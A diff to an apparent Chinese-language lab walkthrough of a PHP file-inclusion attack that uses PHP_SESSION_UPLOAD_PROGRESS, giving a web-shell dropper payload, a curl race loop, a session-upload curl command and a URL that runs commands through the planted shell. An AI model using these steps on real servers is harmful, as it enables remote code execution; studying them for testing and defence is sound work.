@@ -196,3 +196,20 @@ PHP_SESSION_UPLOAD_PROGRESS
     evildropper:<?php file_put_contents('/tmp/shell.php','<?php system($_GET[3])?>'); ?>
 <img  alt="image" src="https://github.com/user-attachments/assets/91179427-5665-4ce2-98ae-a3fafea3d966">
 <img  alt="image" src="https://github.com/user-attachments/assets/8ba98314-7dee-4646-a85f-69c53597d65a">
+
+    寫一個迴圈並grep字串evildropper就停止
+    while true; do (curl -s 'http://<ip_addr>/inc.php?file=/var/lib/php5/sess_uploadupload' | grep evildropper); done
+<img  alt="image" src="https://github.com/user-attachments/assets/748dc45b-a600-406f-84d2-e28c55d76fdc">
+
+    上傳垃圾檔案，讓shell能夠有足夠的時間塞到tmp
+    curl http://<ip_addr>/inc.php -H 'Cookie: PHPSESSID=uploadupload' -F 
+'PHP_SESSION_UPLOAD_PROGRESS=<evildropper.txt' -F 'files=@junk.txt'
+<img alt="image" src="https://github.com/user-attachments/assets/44077993-e9d7-4e9d-8995-7b6d11931d42">
+
+    確認有成功塞進去tmp
+<img  alt="image" src="https://github.com/user-attachments/assets/ecb6e773-c764-48f2-bf8e-f7aa1e743c32">
+
+    執行瀏覽器塞入指令
+    http://192.168.0.10/imc.php?f=/tmp/shell.php&3=id
+<img  alt="image" src="https://github.com/user-attachments/assets/e4f6f37b-fea8-4e75-bdc0-69bc14707f30">
+
